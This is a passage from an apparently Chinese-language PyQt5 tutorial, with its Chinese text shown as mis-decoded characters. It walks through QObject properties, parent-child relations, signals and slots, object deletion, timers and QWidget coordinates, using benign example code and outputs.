window.show()\n    sys.exit(app.exec_())\n```\n\n## PyCharm ä½¿ç”¨æŠ€å·§\n\n### PyCharm è®¾ç½®æ´»åŠ¨æ¨¡æ¿è®¾ç½®\n\n> æ´»åŠ¨æ¨¡æ¿ï¼šå¾ˆç®€å•çš„ä¸€ä¸ªç¤ºä¾‹ï¼Œå°±æ˜¯åœ¨ PyCharm ä¸­è¾“å…¥ main å…³é”®å­—ï¼Œä¼šè‡ªåŠ¨å¸¦å‡ºä¸€äº›é»˜è®¤çš„ä»£ç ï¼Œè¿™ä¸ªå°±æ˜¯æ´»åŠ¨æ¨¡æ¿é…ç½®\n\nPycharm ä¸­ File -ã€‹Settings --> Editor  --> Live Templates --> Python -->å³ä¸Šè§’â€œ+â€å·\n\n![](https://img.jwt1399.top//img/20210723175526.png)\n\n### Pycharm è®¾ç½®ä»£ç ä½œè€…ä¿¡æ¯\n\nPycharm ä¸­ File --> Settings --> Editor  --> File and Code Templates--> Python Script\n\n```python\n# -*- coding: utf-8 -*-\n\"\"\"\n-------------------------------------------------\n# @Project  :${PROJECT_NAME}\n# @File     :${NAME}\n# @Date     :${DATE} ${TIME}\n# @Author   :ä½œè€…å\n# @Software :${PRODUCT_NAME}\n-------------------------------------------------\n\"\"\"\n```\n\n## æŸ¥çœ‹ç»§æ‰¿å…³ç³»\n\n1ã€Ctrl+é¼ æ ‡å·¦é”®ï¼Œç‚¹å…¥åˆ°å†…ç½®æ–‡ä»¶ä¸­ï¼Œç¿»åˆ°ç±»åå¤„æŸ¥çœ‹\n\n2ã€ é€šè¿‡ä¿ç•™å±æ€§`__base__`ï¼Œè¿”å›çš„æ˜¯ç›´æ¥ç»§æ‰¿å…³ç³»\n\n```python\nprint(QWidget.__bases__) # è¿”å›ç»“æœæ˜¯å…ƒç»„\n```\n\n3ã€ä½¿ç”¨ `mro()` ï¼Œè¿”å›æ•´ä¸ªç»§æ‰¿é“¾æ¡ï¼\n\n```python\nprint(QObject.mro()) # è¿”å›ç»“æœæ˜¯åˆ—è¡¨\n```\n\n# æ§ä»¶å­¦ä¹ \n\n## QObject\n\n> QObject æ‰€æœ‰ Qt å¯¹è±¡çš„åŸºç±»\n\n### å¯¹è±¡åç§°å’Œå±æ€§\n\n#### API\n\n- setObjectName(\"unique name\")     è®¾ç½®å¯¹åƒåç§°\n- objectName()   è·å–Qtå¯¹è±¡çš„åç§°\n- setProperty(\"name\", \"value\") è®¾ç½®å¯¹åƒå±æ€§\n- property(\"name\")  è·å–å¯¹è±¡çš„å±æ€§å€¼\n- dynamicPropertyNames()  è·å–å¯¹è±¡ä¸­æ‰€æœ‰é€šè¿‡setProperty()è®¾ç½®çš„å±æ€§åç§°\n\n**APIæµ‹è¯•ï¼š**\n\n```python\nfrom PyQt5.Qt import *  # åˆšå¼€å§‹å­¦ä¹ å¯ä»¥è¿™æ ·ä¸€ä¸‹å¯¼å…¥\nimport sys\n\n\nclass Window(QWidget):\n    def __init__(self):\n        super().__init__()\n        self.setWindowTitle(\"QObjectçš„å­¦ä¹ \")\n        self.resize(400, 400)\n        self.set_ui()\n\n    def set_ui(self):\n        self.QObject_test()\n\n    def QObject_test(self):\n        obj = QObject()\n        obj.setObjectName(\"jianjian\")\n        print(obj.objectName()) \n        obj.setProperty(\"notice_level\", \"error\")\n        obj.setProperty(\"notice_level2\", \"warning\")\n        print(obj.property(\"notice_level\"))\n        print(obj.dynamicPropertyNames())\n\n\nif __name__ == '__main__':\n    app = QApplication(sys.argv)\n    window = Window()\n    window.show()\n    sys.exit(app.exec_())\n```\n\nè¾“å‡ºï¼š\n\n```python\n1 jianjian\n2 error\n3 [PyQt5.QtCore.QByteArray(b'notice_level'), PyQt5.QtCore.QByteArray(b'notice_level2')]\n```\n\n#### åº”ç”¨åœºæ™¯\n\n- ç”¨äºqssçš„IDé€‰æ‹©å™¨ï¼Œå±æ€§é€‰æ‹©å™¨ï¼Œæ–¹ä¾¿ç»Ÿä¸€è®¾ç½®æ ·å¼\n\nQObejct.qss\n\n```css\nQLabel#notice {\n    font-size :20px;\n    color :green;\n    border:1px solid gray;\n    border-radius:8px;\n}\nQLabel#notice[notice_level = \"warning\"] {\n    color :yellow;\n    border-color:yellow;\n}\nQLabel#notice[notice_level = \"error\"] {\n    color :red;\n    border-color:red;\n}\n```\n\ntest.py\n\n```python\nfrom PyQt5.Qt import *  # åˆšå¼€å§‹å­¦ä¹ å¯ä»¥è¿™æ ·ä¸€ä¸‹å¯¼å…¥\nimport sys\n\nclass Window(QWidget):\n    def __init__(self):\n        super().__init__()\n        self.setWindowTitle(\"QObjectçš„å­¦ä¹ \")\n        self.resize(300, 300)\n        self.set_ui()\n\n    def set_ui(self):\n        self.QObject_test()\n\n    def QObject_test(self): # è¯»å–QObject.qss\n        with open(\"QObject.qss\", \"r\") as f:\n            qApp.setStyleSheet(f.read())\n\n        label = QLabel(self)\n        label.setText(\"æ ‡ç­¾1\")\n        label.setObjectName(\"notice\")\n\n        label2 = QLabel(self)\n        label2.setText(\"æ ‡ç­¾2\")\n        label2.move(100, 100)\n        label2.setObjectName(\"notice\")\n        label2.setProperty(\"notice_level\", \"warning\")\n\n        label3 = QLabel(self)\n        label3.setText(\"æ ‡ç­¾3\")\n        label3.move(200, 200)\n        label3.setObjectName(\"notice\")\n        label3.setProperty(\"notice_level\",\"error\")\n\nif __name__ == '__main__':\n    app = QApplication(sys.argv)\n    window = Window()\n    window.show()\n    sys.exit(app.exec_())\n```\n\n![](https://img.jwt1399.top//img/20210724172408.png)\n\n### çˆ¶å­å…³ç³»æ“ä½œ\n\n#### API\n\n- setParent(parent) è®¾ç½®çˆ¶å¯¹è±¡ï¼Œçˆ¶å¯¹è±¡åªèƒ½è®¾ç½®ä¸€ä¸ª\n- parent() è·å–çˆ¶å¯¹è±¡\n- children() è·å–æ‰€æœ‰ç›´æ¥å­å¯¹è±¡\n- findChild(å‚æ•°1,å‚æ•°2,å‚æ•°3) è·å–æŸä¸€ä¸ªæŒ‡å®šç±»å‹å’Œåç§°çš„å­å¯¹è±¡\n  - å‚æ•°1ï¼š\n    - ç±»å‹ QObject\n    - ç±»å‹å…ƒç»„ (QPushButton, QLabel)\n  - å‚æ•°2ï¼šå¯¹è±¡åç§°\n  - å‚æ•°3ï¼šæŸ¥æ‰¾é€‰é¡¹\n    - Qt.FindChildrenRecursively é€’å½’æŸ¥æ‰¾(é»˜è®¤é€‰é¡¹)\n    - Qt.FindDirectChildrenOnly   åªæŸ¥æ‰¾ç›´æ¥å­å¯¹è±¡\n- findChildren(å‚æ•°1,å‚æ•°2,å‚æ•°3) è·å–æŸä¸€ä¸ªæŒ‡å®šåç§°æ‰€æœ‰å­å¯¹è±¡ï¼Œå‚æ•°åŒä¸Š\n\n **APIæµ‹è¯•ï¼šæ„é€ å¦‚ä¸‹çˆ¶å­å›¾**\n\n![](https://img.jwt1399.top//img/20210726085600.png)\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\nclass Window(QMainWindow):\n    def __init__(self):\n        super().__init__() # ç»§æ‰¿çˆ¶ç±»çš„initæ–¹æ³•\n        self.resize(500, 400)\n        self.move(300, 300)\n        self.setWindowTitle('çˆ¶å­å¯¹è±¡')\n        self.set_ui()\n\n    def set_ui(self):\n        self.QObject_test()\n\n    def QObject_test(self):\n        obj0 = QObject()\n        obj1 = QObject()\n        obj2 = QObject()\n        obj3 = QObject()\n        obj4 = QObject()\n        obj5 = QObject()\n\n        # æ‰“å°å„ä¸ªå¯¹è±¡å˜é‡  ä¹Ÿå¯print('obj0:', obj0)\n        for i in range(6):\n            name = \"obj\" + str(i)\n            print(name,eval(name))\n\n        #è®¾ç½®çˆ¶å¯¹è±¡\n        obj1.setParent(obj0)\n        obj2.setParent(obj0)\n        obj3.setParent(obj1)\n        obj4.setParent(obj2)\n        obj5.setParent(obj2)\n\n        # è®¾ç½®å¯¹è±¡åç§°\n        obj2.setObjectName(\"2\")\n        obj3.setObjectName(\"3\")\n        \n        # APIæµ‹è¯•ç»“æœ\n        print('obj0çˆ¶å¯¹è±¡ï¼š', obj0.parent())\n        print('obj0æ‰€æœ‰ç›´æ¥å­å¯¹è±¡ï¼š', obj0.children())\n        print('obj0çš„ç¬¬ä¸€ä¸ªå­å¯¹è±¡ï¼š', obj0.findChild(QObject))\n        print('obj0çš„ç¬¬äºŒä¸ªå­å¯¹è±¡ï¼š', obj0.findChild(QObject,\"2\"))\n        print('obj0çš„ç¬¬ä¸‰ä¸ªå­å¯¹è±¡(å­™å­)ï¼š', obj0.findChild(QObject, \"3\", Qt.FindChildrenRecursively)) #é€’å½’ï¼ˆé»˜è®¤é€‰é¡¹ï¼Œå¯ä¸å†™ï¼‰\n        print('obj0çš„ç¬¬ä¸‰ä¸ªå­å¯¹è±¡(å­™å­)ï¼š', obj0.findChild(QObject, \"3\", Qt.FindDirectChildrenOnly))  #åªæŸ¥æ‰¾ç›´æ¥å­å¯¹è±¡\n        print('obj0çš„æ‰€æœ‰å­å¯¹è±¡ï¼š', obj0.findChildren(QObject))\n\nif __name__ == '__main__':\n    app = QApplication(sys.argv)\n    window = Window()\n    window.show()\n    sys.exit(app.exec_())\n```\n\nè¾“å‡ºï¼š\n\n```python\nobj0 <PyQt5.QtCore.QObject object at 0x000002749F7F33A8>\nobj1 <PyQt5.QtCore.QObject object at 0x000002749F7F3438>\nobj2 <PyQt5.QtCore.QObject object at 0x000002749F7F34C8>\nobj3 <PyQt5.QtCore.QObject object at 0x000002749F7F3558>\nobj4 <PyQt5.QtCore.QObject object at 0x000002749F7F35E8>\nobj5 <PyQt5.QtCore.QObject object at 0x000002749F7F3678>\nobj0çˆ¶å¯¹è±¡ï¼š None\nobj0æ‰€æœ‰ç›´æ¥å­å¯¹è±¡ï¼š [<PyQt5.QtCore.QObject object at 0x000002749F7F3438>, <PyQt5.QtCore.QObject object at 0x000002749F7F34C8>]\nobj0çš„ç¬¬ä¸€ä¸ªå­å¯¹è±¡ï¼š <PyQt5.QtCore.QObject object at 0x000002749F7F3438>\nobj0çš„ç¬¬äºŒä¸ªå­å¯¹è±¡ï¼š <PyQt5.QtCore.QObject object at 0x000002749F7F34C8>\nobj0çš„ç¬¬ä¸‰ä¸ªå­å¯¹è±¡(å­™å­)ï¼š <PyQt5.QtCore.QObject object at 0x000002749F7F3558>\nobj0çš„ç¬¬ä¸‰ä¸ªå­å¯¹è±¡(å­™å­)ï¼š None\nobj0çš„æ‰€æœ‰å­å¯¹è±¡ï¼š [<PyQt5.QtCore.QObject object at 0x000002749F7F3438>, <PyQt5.QtCore.QObject object at 0x000002749F7F3558>, <PyQt5.QtCore.QObject object at 0x000002749F7F34C8>, <PyQt5.QtCore.QObject object at 0x000002749F7F35E8>, <PyQt5.QtCore.QObject object at 0x000002749F7F3678>]\n\n```\n\n#### åº”ç”¨åœºæ™¯\n\n- å†…å­˜ç®¡ç†æœºåˆ¶-å½“çˆ¶å¯¹è±¡é”€æ¯çš„æ—¶å€™ï¼Œå­å¯¹è±¡ä¹Ÿä¼šè¢«é”€æ¯ã€‚\n\n- å¦‚æœä¸€ä¸ªæ§ä»¶ï¼Œæ²¡æœ‰ä»»ä½•çˆ¶æ§ä»¶ã€‚é‚£ä¹ˆå°±ä¼šè¢«å½“æˆ–é¡¶å±‚æ§ä»¶(çª—å£)ã€‚\n- å¦‚æœç›¸è¦ä¸€ä¸ªæ§ä»¶è¢«åŒ…å«åœ¨å¦å¤–ä¸€ä¸ªæ§ä»¶å†…éƒ¨ï¼å°±éœ€è¦è®¾ç½®çˆ¶å­å…³ç³»ã€‚\n\n### ä¿¡å·ä¸æ§½æœºåˆ¶\n\n#### API\n\n- widget.ä¿¡å·.connect(æ§½)     è¿æ¥ä¿¡å·ä¸æ§½\n- widget.ä¿¡å·.disconnect()     å–æ¶ˆè¿æ¥ä¿¡å·ä¸æ§½\n- widget.blockSignals(bool)   ä¸´æ—¶ï¼ˆå–æ¶ˆï¼‰é˜»æ­¢æŒ‡å®šæ§ä»¶æ‰€æœ‰çš„ä¿¡å·ä¸æ§½çš„è¿æ¥\n- widget.signalsBlocked()       ä¿¡å·æ˜¯å¦è¢«é˜»æ­¢\n- widget.receivers(ä¿¡å·)         è¿”å›è¿æ¥åˆ°ä¿¡å·çš„æ¥æ”¶å™¨æ•°é‡(æ§½çš„æ•°é‡)\n\n#### åº”ç”¨åœºæ™¯\n\n**ç›‘å¬ä¿¡å·, å“åº”ç”¨æˆ·è¡Œä¸º**\n\næ¡ˆä¾‹ä¸€ï¼šç‚¹å‡»æŒ‰é’®æ˜¾ç¤ºå†…å®¹\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\nclass Window(QMainWindow):\n    def __init__(self):\n        super().__init__() # ç»§æ‰¿çˆ¶ç±»çš„initæ–¹æ³•\n        self.resize(500, 400)\n        self.move(300, 300)\n        self.setWindowTitle('ä¿¡å·ä¸æ§½')\n        self.setup_ui()\n\n    def setup_ui(self):\n        self.QObject_signal_test()\n\n    def QObject_signal_test(self):\n        btn = QPushButton(self)\n        btn.setText(\"ç‚¹æˆ‘å‘€\")\n\n        def clicked_slot(self):\n            print(\"ç‚¹æˆ‘å¹²å•¥\")\n\n        btn.clicked.connect(clicked_slot)\n\nif __name__ == '__main__':\n    app = QApplication(sys.argv)\n    window = Window()\n    window.show()\n    sys.exit(app.exec_())\n```\n\næ¡ˆä¾‹äºŒï¼šåœ¨æ‰€æœ‰ä¿®æ”¹çš„çª—å£æ ‡é¢˜å‰, æ·»åŠ å‰ç¼€\"ç®€ç®€-\"\n\n```python\nfrom PyQt5.Qt import *  # åˆšå¼€å§‹å­¦ä¹ å¯ä»¥è¿™æ ·ä¸€ä¸‹å¯¼å…¥\nimport sys\n\nclass Window(QMainWindow):\n    def __init__(self):\n        super().__init__() # ç»§æ‰¿çˆ¶ç±»çš„initæ–¹æ³•\n        self.resize(500, 400)\n        self.move(300, 300)\n        self.setWindowTitle('ä¿¡å·ä¸æ§½')\n\nif __name__ == '__main__':\n    app = QApplication(sys.argv) # åˆ›å»ºåº”ç”¨ç¨‹åºå¯¹è±¡\n    window = Window()\n\n    def windowTitleChanged_slot(arg):\n        print(\"ä¿®æ”¹çš„æ ‡é¢˜æ˜¯ï¼š\",arg)    # argä¸ºwindowTitleChangedä¼ å›çš„å‚æ•°\n        window.blockSignals(True)   # ä¸´æ—¶é˜»å¡ä¿¡å·ï¼Œä¸é˜»æ–­å°†ä¼šé™·å…¥æ­»å¾ªç¯\n        print(\"ä¿¡å·æ˜¯å¦é˜»æ–­ï¼š\",window.signalsBlocked())\n        window.setWindowTitle(\"ç®€ç®€-\"+ arg)\n        window.blockSignals(False)  # å†æ¬¡å¼€å¯ä¿¡å·çš„è¿æ¥,ä¸å¼€å¯çš„è¯åªèƒ½æˆåŠŸæ·»åŠ ä¸€æ¬¡å‰ç¼€\n        print(\"ä¿¡å·æ˜¯å¦é˜»æ–­ï¼š\", window.signalsBlocked())\n\n    window.windowTitleChanged.connect(windowTitleChanged_slot) # è¿æ¥ä¿¡å·å’Œæ§½\n    window.setWindowTitle(\"æµ‹è¯•\")\n    window.setWindowTitle(\"æµ‹è¯•2\")\n    print(\"ä¿¡å·æœ‰{}ä¸ªæ§½å‡½æ•°\".format(window.receivers(window.windowTitleChanged)))\n    window.windowTitleChanged.disconnect()  # å–æ¶ˆä¿¡å·å’Œæ§½ä¹‹é—´çš„è”ç³»\n    window.setWindowTitle(\"æµ‹è¯•3\")\n    print(\"ä¿¡å·æœ‰{}ä¸ªæ§½å‡½æ•°\".format(window.receivers(window.windowTitleChanged)))\n\n    window.show() # å±•ç¤ºæ§ä»¶\n    sys.exit(app.exec_())\n```\n\nè¾“å‡ºï¼š\n\n```python\nä¿®æ”¹çš„æ ‡é¢˜æ˜¯ï¼š æµ‹è¯•\nä¿¡å·æ˜¯å¦é˜»æ–­ï¼š True\nä¿¡å·æ˜¯å¦é˜»æ–­ï¼š False\nä¿®æ”¹çš„æ ‡é¢˜æ˜¯ï¼š æµ‹è¯•2\nä¿¡å·æ˜¯å¦é˜»æ–­ï¼š True\nä¿¡å·æ˜¯å¦é˜»æ–­ï¼š False\nä¿¡å·æœ‰1ä¸ªæ§½å‡½æ•°\nä¿¡å·æœ‰0ä¸ªæ§½å‡½æ•°\n```\n\n### ç±»å‹åˆ¤å®š\n\n#### API\n\n- isWidgetType()  æ˜¯å¦æ˜¯æ§ä»¶ç±»å‹\n- inherits(çˆ¶ç±»)    ä¸€ä¸ªå¯¹è±¡æ˜¯å¦ç»§æ‰¿ï¼ˆç›´æ¥æˆ–è€…é—´æ¥ï¼‰è‡ªæŸä¸ªç±»\n\n**APIæµ‹è¯•ï¼š**\n\n```python\nfrom PyQt5.Qt import *  # åˆšå¼€å§‹å­¦ä¹ å¯ä»¥è¿™æ ·ä¸€ä¸‹å¯¼å…¥\nimport sys\n\nclass Window(QMainWindow):\n    def __init__(self):\n        super().__init__() # ç»§æ‰¿çˆ¶ç±»çš„initæ–¹æ³•\n        self.resize(500, 400)\n        self.move(300, 300)\n        self.setWindowTitle('ç±»å‹åˆ¤å®š')\n        self.setup_ui()\n\n    def setup_ui(self):\n        self.QObject_type_judge()\n\n    def QObject_type_judge(self):\n        obj = QObject()\n        w = QWidget()\n        btn = QPushButton()\n        label = QLabel()\n        list = [obj, w, btn, label]\n        print(\"isWidgetTypeæµ‹è¯•\")\n        for i in list:\n            print(\"æ˜¯å¦æ˜¯æ§ä»¶ç±»å‹:\", i.isWidgetType())\n        print(\"inheritsæµ‹è¯•\")\n        for i in list:\n            print(\"æ˜¯å¦ç»§æ‰¿è‡ªQWidget:\", i.inherits(\"QWidget\"))\n\nif __name__ == '__main__':\n    app = QApplication(sys.argv) # åˆ›å»ºåº”ç”¨ç¨‹åºå¯¹è±¡\n    window = Window()\n    window.show() # å±•ç¤ºæ§ä»¶\n    sys.exit(app.exec_())\n\n```\n\nè¾“å‡ºï¼š\n\n```python\nisWidgetTypeæµ‹è¯•\næ˜¯å¦æ˜¯æ§ä»¶ç±»å‹: False\næ˜¯å¦æ˜¯æ§ä»¶ç±»å‹: True\næ˜¯å¦æ˜¯æ§ä»¶ç±»å‹: True\næ˜¯å¦æ˜¯æ§ä»¶ç±»å‹: True\ninheritsæµ‹è¯•\næ˜¯å¦ç»§æ‰¿è‡ªQWidget: False\næ˜¯å¦ç»§æ‰¿è‡ªQWidget: True\næ˜¯å¦ç»§æ‰¿è‡ªQWidget: True\næ˜¯å¦ç»§æ‰¿è‡ªQWidget: True\n```\n\n#### åº”ç”¨åœºæ™¯\n\n**è¿‡æ»¤ç­›é€‰æ§ä»¶**\n\næ¡ˆä¾‹ï¼š åˆ›å»ºä¸€ä¸ªçª—å£, åŒ…å«å¤šä¸ªQLabelæˆ–å…¶ä»–æ§ä»¶ï¼Œå°†åŒ…å«åœ¨çª—å£å†…æ‰€æœ‰çš„QLabelæ§ä»¶, è®¾ç½®èƒŒæ™¯è‰²cyan\n\n```python\nfrom PyQt5.Qt import *  # åˆšå¼€å§‹å­¦ä¹ å¯ä»¥è¿™æ ·ä¸€ä¸‹å¯¼å…¥\nimport sys\n\nclass Window(QWidget):\n    def __init__(self):\n        super().__init__()\n        self.setWindowTitle(\"QObjectçš„å­¦ä¹ \")\n        self.resize(400, 400)\n        self.set_ui()\n\n    def set_ui(self):\n        self.QObject_type_judge()\n\n    def QObject_type_judge(self):\n        label_1 = QLabel(self)\n        label_1.setText(\"æ ‡ç­¾1\")\n\n        label_2 = QLabel(self)\n        label_2.setText(\"æ ‡ç­¾2\")\n        label_2.move(100,100)\n\n        btn = QPushButton(self)\n        btn.setText(\"æŒ‰é’®\")\n        btn.move(200,200)\n\n        for widget in self.children():\n            if widget.inherits(\"QLabel\"):\n                widget.setStyleSheet(\"background-color:cyan;\")\n\nif __name__ == '__main__':\n    app = QApplication(sys.argv)\n    window = Window()\n    window.show()\n    sys.exit(app.exec_())\n```\n\n### å¯¹è±¡åˆ é™¤\n\n#### API\n\n- obj.deleteLater()   ç¨ååˆ é™¤ï¼Œåˆ é™¤ä¸€ä¸ªå¯¹è±¡æ—¶, ä¹Ÿä¼šè§£é™¤å®ƒä¸çˆ¶å¯¹è±¡ä¹‹é—´çš„å…³ç³»\n- deleteLater()å¹¶æ²¡æœ‰å°†å¯¹è±¡ç«‹å³é”€æ¯ï¼Œè€Œæ˜¯å‘ä¸»æ¶ˆæ¯å¾ªç¯å‘é€äº†ä¸€ä¸ªeventï¼Œä¸‹ä¸€æ¬¡ä¸»æ¶ˆæ¯å¾ªç¯æ”¶åˆ°è¿™ä¸ªeventä¹‹åæ‰ä¼šé”€æ¯å¯¹è±¡ï¼Œè¿™æ ·åšçš„å¥½å¤„æ˜¯å¯ä»¥åœ¨è¿™äº›å»¶è¿Ÿåˆ é™¤çš„æ—¶é—´å†…å®Œæˆä¸€äº›æ“ä½œï¼Œåå¤„å°±æ˜¯å†…å­˜é‡Šæ”¾ä¼šä¸åŠæ—¶\n\n**APIæµ‹è¯•ï¼š**\n\n```python\nfrom PyQt5.Qt import *  # åˆšå¼€å§‹å­¦ä¹ å¯ä»¥è¿™æ ·ä¸€ä¸‹å¯¼å…¥\nimport sys\n\nclass Window(QMainWindow):\n    def __init__(self):\n        super().__init__() # ç»§æ‰¿çˆ¶ç±»çš„initæ–¹æ³•\n        self.resize(500, 400)\n        self.move(300, 300)\n        self.setWindowTitle('å¯¹è±¡åˆ é™¤')\n        self.setup_ui()\n\n    def setup_ui(self):\n        self.QObject_delete()\n\n    def QObject_delete(self):\n        obj1 = QObject()\n        self.obj = obj1\n        obj2 = QObject()\n        obj3 = QObject()\n\n        obj3.setParent(obj2)\n        obj2.setParent(obj1)\n\n        obj1.destroyed.connect(lambda: print(\"obj1 è¢«é‡Šæ”¾\"))\n        obj2.destroyed.connect(lambda: print(\"obj2 è¢«é‡Šæ”¾\"))\n        obj3.destroyed.connect(lambda: print(\"obj3 è¢«é‡Šæ”¾\"))\n\n        # del obj2 # è¿™æ—¶å€™æ²¡æœ‰ä»»ä½•æ•ˆæœï¼Œå› ä¸ºobj2è¿˜è¢«obj1å¼•ç”¨ç€å‘¢ï¼\n        obj2.deleteLater()     # åˆ é™¤å¯¹è±¡æ—¶ï¼Œä¹Ÿä¼šè§£é™¤å®ƒä¸çˆ¶å¯¹è±¡çš„å…³ç³»ï¼Œè€Œä¸”æ˜¯ç¨ååˆ é™¤ã€‚\n        print(obj1.children()) # å› ä¸ºdeleteLateræ˜¯ç¨ååˆ é™¤ï¼Œæ‰€ä»¥å­èŠ‚ç‚¹è¿˜åœ¨\n\n\nif __name__ == '__main__':\n    app = QApplication(sys.argv) # åˆ›å»ºåº”ç”¨ç¨‹åºå¯¹è±¡\n    window = Window()\n    window.show() # å±•ç¤ºæ§ä»¶\n    sys.exit(app.exec_())\n```\n\nè¾“å‡ºï¼š\n\n```python\n[<PyQt5.QtCore.QObject object at 0x0000022E610E45E8>]\nobj2 è¢«é‡Šæ”¾\nobj3 è¢«é‡Šæ”¾\n```\n\n#### åº”ç”¨åœºæ™¯\n\n**æƒ³è¦ç§»é™¤æŸä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™ä½¿ç”¨**\n\n### äº‹ä»¶å¤„ç†\n\n#### API\n\n- childEvent()\n\n- customEvent()\n\n- eventFilter()\n\n- installEventFilter()\n\n- removeEventFilter\n\n- event()\n\n#### åº”ç”¨åœºæ™¯\n\n**äº‹ä»¶æœºåˆ¶ã€æ‹¦æˆªäº‹ä»¶, ç›‘å¬ç‰¹å®šè¡Œä¸º**\n\næ¡ˆä¾‹\n\næš‚æ—¶æ¬ ç€ã€‚ã€‚ã€‚\n\n### å®šæ—¶å™¨\n\n#### API\n\n- startTimer(ms, Qt.TimerType) -> timer_id å¯åŠ¨ä¸€ä¸ªå®šæ—¶å™¨äº‹ä»¶å¹¶è¿”å›ä¸€ä¸ªå®šæ—¶å™¨timer_id \n  - ms   æ¯éš”msæ¯«ç§’å°±ä¼šå¯åŠ¨ä¸€æ¬¡\n\n- Qt.TimerType\n  - Qt.PreciseTimer        ç²¾ç¡®å®šæ—¶å™¨ï¼šå°½å¯èƒ½ä¿æŒæ¯«ç§’å‡†ç¡®\n  - Qt.CoarseTimer         ç²—å®šæ—¶å™¨ï¼š5%çš„è¯¯å·®é—´éš”\n  - Qt.VeryCoarseTimer  å¾ˆç²—çš„å®šæ—¶å™¨ï¼šåªèƒ½åˆ°ç§’çº§\n- timer_id å®šæ—¶å™¨çš„å”¯ä¸€æ ‡è¯†\n\n- killTimer(timer_id) æ ¹æ®å®šæ—¶å™¨IDï¼Œæ€æ­»å®šæ—¶å™¨\n- timerEvent() å®šæ—¶å™¨æ‰§è¡Œäº‹ä»¶\n\n**APIæµ‹è¯•**\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\nclass MyQObject(QObject):  # é‡å†™QObject()ä¸­çš„timerevent() æ–¹æ³•\n    def timerEvent(self,evnt):\n        print(evnt,\"æ¯éš”ä¸€ç§’æ‰“å°\")\n\napp = QApplication(sys.argv)\nwindow = QMainWindow()\nwindow.setWindowTitle('å®šæ—¶å™¨')\nobj = MyQObject()\ntime_id = obj.startTimer(1000)  # æ¯éš”1sè°ƒç”¨QObject() ä¸­çš„timerevent() æ–¹æ³•  #æ‰€ä»¥æ­¤æ—¶åº”è¯¥é‡å†™QObject()ä¸­çš„timerevent() æ–¹æ³•\n# obj.killTimer(time_id)  #å¦‚æœæƒ³åœæ­¢å®ƒï¼Œå°†å®šæ—¶å™¨id ä¼ ç»™ killTimer() å³å¯\n\nwindow.show()\nsys.exit(app.exec_())\n```\n\nè¾“å‡ºï¼š\n\n```python\n<PyQt5.QtCore.QTimerEvent object at 0x000002081A182318> æ¯éš”ä¸€ç§’æ‰“å°\n<PyQt5.QtCore.QTimerEvent object at 0x000002081A182318> æ¯éš”ä¸€ç§’æ‰“å°\n<PyQt5.QtCore.QTimerEvent object at 0x000002081A182318> æ¯éš”ä¸€ç§’æ‰“å°\n```\n\n#### åº”ç”¨åœºæ™¯\n\n**è½®è¯¢ã€å€’è®¡æ—¶**\n\næ¡ˆä¾‹1ï¼šåˆ›å»ºä¸€ä¸ªçª—å£, å¹¶è®¾ç½®ä¸€ä¸ªå­æ§ä»¶QLabelï¼Œå±•ç¤º10så€’è®¡æ—¶ï¼Œå€’è®¡æ—¶ç»“æŸ, å°±åœæ­¢è®¡æ—¶ã€‚\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\nclass MyLabel(QLabel): # å°è£…ç‰ˆæœ¬\n\n    def __init__(self, *args, **kwargs):  # è¿™æ›´åŠ é€šç”¨\n        super().__init__(*args, **kwargs)\n        self.setText(\"10\")\n        self.setStyleSheet(\"font-size:22px;\")\n        self.move(200, 200)\n        self.timer_id = self.startTimer(1000)\n\n    def timerEvent(self, *args, **kwargs):\n        # è·å–å½“å‰çš„æ ‡ç­¾å†…å®¹\n        print(\"å¼€å§‹è®¡æ—¶\")\n        current_sec = int(self.text())\n        current_sec -= 1\n        self.setText(str(current_sec))\n        if current_sec == 0:\n            self.killTimer(self.timer_id)\n            print(\"è®¡æ—¶ç»“æŸ\")\n\napp = QApplication(sys.argv)\nwindow = QMainWindow()\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle('å®šæ—¶å™¨')\n\nlabel = MyLabel(window)\n\nwindow.show()\nsys.exit(app.exec_())\n```\n\næ¡ˆä¾‹2ï¼šåˆ›å»ºä¸€ä¸ªçª—å£, é€šè¿‡å®šæ—¶å™¨ä¸æ–­å¢åŠ è¯¥çª—å£çš„å°ºå¯¸å¤§å°ï¼Œæ¯100ms å®½é«˜å‡å¢åŠ 1px\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\nclass MyWidget(QWidget):\n     def timerEvent(self, *args, **kwargs):\n         current_w = self.width()\n         current_h = self.height()\n         self.resize(current_w+10,current_h+10)\n\napp = QApplication(sys.argv)\nwindow = MyWidget()\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle('å®šæ—¶å™¨')\n\nwindow.startTimer(100)\n\nwindow.show()\nsys.exit(app.exec_())\n```\n\n## QWidget\n\n> æ‰€æœ‰çš„å¯è§†æ§ä»¶çš„åŸºç±»\n\n### åæ ‡ç³»ç»Ÿ\n\nå·¦ä¸Šè§’ä¸ºåæ ‡åŸç‚¹ï¼Œå‘å³ä¸ºxè½´æ­£æ–¹å‘ï¼Œå‘ä¸‹ä¸ºyè½´æ­£æ–¹å‘\n\næ§ä»¶ä½ç½®å‚ç…§ï¼š\n\n- ä¸€èˆ¬æ§ä»¶å‚ç…§çˆ¶æ§ä»¶\n\n- é¡¶å±‚æ§ä»¶åˆ™å‚ç…§æ¡Œé¢\n\n### å°ºå¯¸ä½ç½®\n\n#### å°ºå¯¸è·å–API\n\n- x()                            ç›¸å¯¹äºçˆ¶æ§ä»¶çš„xä½ç½®ï¼Œæ²¡æœ‰çˆ¶æ§ä»¶åˆ™ç›¸å¯¹äºæ¡Œé¢çš„xä½ç½®\n- y()                            åŒä¸Š\n- pos()                         xå’Œyçš„ç»„åˆï¼ŒåŒ…å«çª—å£æ¡†æ¶\n- width()                     æ§ä»¶çš„å®½åº¦ï¼Œä¸åŒ…å«ä»»ä½•çª—å£æ¡†æ¶\n- height()                     æ§ä»¶çš„é«˜åº¦ï¼Œä¸åŒ…å«ä»»ä½•çª—å£æ¡†æ¶\n- size()                         widthå’Œheightçš„ç»„åˆï¼Œä¸åŒ…å«ä»»ä½•çª—å£æ¡†æ¶\n- geometry()                ç”¨æˆ·åŒºåŸŸç›¸å¯¹äºçˆ¶æ§ä»¶çš„ä½ç½®å’Œå°ºå¯¸ç»„åˆ\n- rect()                       